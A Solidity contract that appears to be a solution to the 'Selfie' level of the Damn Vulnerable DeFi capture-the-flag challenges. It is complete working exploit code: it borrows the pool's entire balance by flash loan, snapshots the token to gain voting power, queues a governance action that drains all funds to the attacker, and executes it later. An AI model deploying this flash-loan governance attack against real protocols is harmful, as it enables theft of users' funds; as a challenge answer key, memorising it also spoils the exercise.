// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "@openzeppelin/contracts/utils/Address.sol";
import "../selfie/SimpleGovernance.sol";
import "../selfie/SelfiePool.sol";
import "../DamnValuableTokenSnapshot.sol";

contract SelfieAttack {
    DamnValuableTokenSnapshot token;
    address pool;
    address gov;
    address attacker;
    uint256 actionId;

    constructor(
        address _token,
        address _pool,
        address _gov,
        address _attacker
    ) {
        token = DamnValuableTokenSnapshot(_token);
        pool = _pool;
        gov = _gov;
        attacker = _attacker;
    }

    function attack() public {
        SelfiePool(pool).flashLoan(token.balanceOf(pool));
    }

    function receiveTokens(address, uint256 amount) external {
        token.snapshot();
        actionId = SimpleGovernance(gov).queueAction(
            pool,
            abi.encodeWithSignature(
                "drainAllFunds(address)",
                attacker
            ),
            0
        );
        token.transfer(pool, amount);
    }

    function execute() public {
        require(msg.sender == attacker);
        SimpleGovernance(gov).executeAction(actionId);
    }

    receive() external payable {}
}
